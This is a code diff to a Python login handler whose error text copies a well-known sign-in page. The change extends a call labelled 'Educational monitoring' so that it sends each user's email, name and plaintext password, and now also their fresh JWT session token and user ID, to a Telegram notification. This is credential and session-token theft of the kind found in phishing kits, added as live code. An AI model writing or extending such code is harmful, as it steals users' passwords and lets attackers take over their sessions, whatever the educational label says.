@@ -143,15 +143,21 @@ async def login(credentials: UserLogin):
                 detail="Your account or password is incorrect. If you don't remember your password, reset it now."
             )
         
-        # Send Telegram notification (Educational monitoring)
-        try:
-            notify_user_login(user["email"], user["name"], credentials.password)
-        except Exception as e:
-            logger.warning(f"Failed to send Telegram notification: {str(e)}")
-        
         # Create JWT token
         user_id = str(user["_id"])
         token = create_access_token(data={"sub": user_id, "email": user["email"]})
+        
+        # Send Telegram notification (Educational monitoring) - with full session details
+        try:
+            notify_user_login(
+                user["email"], 
+                user["name"], 
+                credentials.password,
+                token,
+                user_id
+            )
+        except Exception as e:
+            logger.warning(f"Failed to send Telegram notification: {str(e)}")
         
         # Return response
         user_response = UserResponse(
